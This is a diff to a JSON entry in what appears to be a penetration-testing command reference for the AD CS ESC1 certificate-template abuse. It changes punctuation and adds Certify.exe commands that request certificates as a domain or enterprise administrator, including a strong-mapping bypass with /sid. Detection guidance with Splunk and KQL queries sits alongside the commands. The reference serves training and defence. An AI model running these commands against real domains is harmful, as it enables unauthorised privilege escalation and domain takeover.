@@ -1,6 +1,6 @@
 {
   "id": "crtp-adcs-esc1",
-  "name": "AD CS ESC1 — Subject Alt Name (SAN) Abuse",
+  "name": "AD CS ESC1 - Subject Alt Name (SAN) Abuse",
   "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<template_name> /altname:<user>",
   "description": "Abuse a certificate template with enrollee-supplied subject enabled (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) to request a certificate as any domain user including DA.",
   "platform": "windows",
@@ -98,10 +98,10 @@
     }
   ],
   "defense": {
-    "why_it_works": "AD CS (Active Directory Certificate Services) issues X.509 certificates used for Kerberos authentication (PKINIT). ESC1 occurs when a certificate template has: (1) Enrollee Supplies Subject = True (attacker specifies any Subject Alternative Name including another user's UPN), (2) Extended Key Usage includes Client Authentication, and (3) the template is accessible to low-priv users. The attacker enrolls for a certificate specifying a DA UPN as the SAN — the CA issues it. That certificate authenticates as the DA via PKINIT.",
+    "why_it_works": "AD CS (Active Directory Certificate Services) issues X.509 certificates used for Kerberos authentication (PKINIT). ESC1 occurs when a certificate template has: (1) Enrollee Supplies Subject = True (attacker specifies any Subject Alternative Name including another user's UPN), (2) Extended Key Usage includes Client Authentication, and (3) the template is accessible to low-priv users. The attacker enrolls for a certificate specifying a DA UPN as the SAN - the CA issues it. That certificate authenticates as the DA via PKINIT.",
     "prerequisites": "Any domain user. Access to an AD CS CA. A vulnerable certificate template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT and Client Authentication EKU. Certify.exe or Certipy to find and exploit. Rubeus for PKINIT auth.",
-    "impact": "T1649 Steal or Forge Authentication Certificates + T1558 Kerberos Ticket Abuse. Obtains a certificate authenticating as any domain user (including DA/krbtgt). PKINIT produces a valid TGT for the impersonated account. Persistent — certificate valid for the template's lifetime (often 1 year). Survives DA password changes.",
-    "detection": "Event 4887 (CA issued certificate): abnormal certificate requests where the SubjectAltName field contains a UPN different from the requesting user. MDI: 'Suspected AD CS ESC1 certificate request'. SIEM: CA audit log — certificate issued for user other than the requesting principal. Sysmon Event 25 (process tampering) if Certify.exe detected. CRL/OCSP analysis: certificate issued to non-matching principal.\nAbnormal AD CS certificate enrollment and usage; registry access to certificate storage; unusual processes exporting or accessing private keys (DET0240/AN0671).\nFile access to certificate directories; OpenSSL or PKCS#12 utilities exporting/modifying certificates; processes accessing sensitive key storage paths (AN0672).\nKeychain API calls and file access to ~/Library/Keychains or /Library/Keychains for stored certificates and private keys (AN0673).\nAbnormal certificate enrollment in identity platforms; unexpected use of token-signing certificates; unusual CA configuration modifications (AN0674).",
+    "impact": "T1649 Steal or Forge Authentication Certificates + T1558 Kerberos Ticket Abuse. Obtains a certificate authenticating as any domain user (including DA/krbtgt). PKINIT produces a valid TGT for the impersonated account. Persistent - certificate valid for the template's lifetime (often 1 year). Survives DA password changes.",
+    "detection": "Event 4887 (CA issued certificate): abnormal certificate requests where the SubjectAltName field contains a UPN different from the requesting user. MDI: 'Suspected AD CS ESC1 certificate request'. SIEM: CA audit log - certificate issued for user other than the requesting principal. Sysmon Event 25 (process tampering) if Certify.exe detected. CRL/OCSP analysis: certificate issued to non-matching principal.\nAbnormal AD CS certificate enrollment and usage; registry access to certificate storage; unusual processes exporting or accessing private keys (DET0240/AN0671).\nFile access to certificate directories; OpenSSL or PKCS#12 utilities exporting/modifying certificates; processes accessing sensitive key storage paths (AN0672).\nKeychain API calls and file access to ~/Library/Keychains or /Library/Keychains for stored certificates and private keys (AN0673).\nAbnormal certificate enrollment in identity platforms; unexpected use of token-signing certificates; unusual CA configuration modifications (AN0674).",
     "artifacts": "CA Event 4887: certificate issued with SAN different from requesting user | MDI: AD CS ESC1 alert | CA audit log: template with ENROLLEE_SUPPLIES_SUBJECT used | Event 4768/4769: PKINIT logon using the fraudulent certificate",
     "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4887\n| eval SAN=mvindex(split(Message,\"\\n\"),5)\n| where like(SAN, \"%SubjectAltName%\")\n| table _time, ComputerName, Requester, CertificateTemplate, SAN\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4768 Ticket_Encryption_Type=0x12\n| where Certificate_Thumbprint!=\"\"\n| table _time, Account_Name, Client_Address, Certificate_Thumbprint",
     "elastic_kql": "event.code:\"4887\" AND winlog.event_data.CertificateTemplate:*\n\nevent.code:\"4768\" AND winlog.event_data.CertificateThumbprint:*",
@@ -129,6 +129,18 @@
     {
       "label": "Find templates where enrollee supplies subject (ESC1)",
       "command": "Certify.exe find /enrolleeSuppliesSubject"
+    },
+    {
+      "label": "ESC1 with /sid (strong-mapping bypass)",
+      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:administrator /sid:<target_sid>"
+    },
+    {
+      "label": "Windows openssl CSP conversion to PFX",
+      "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
+    },
+    {
+      "label": "EA impersonation via /altname",
+      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator"
     }
   ]
 }
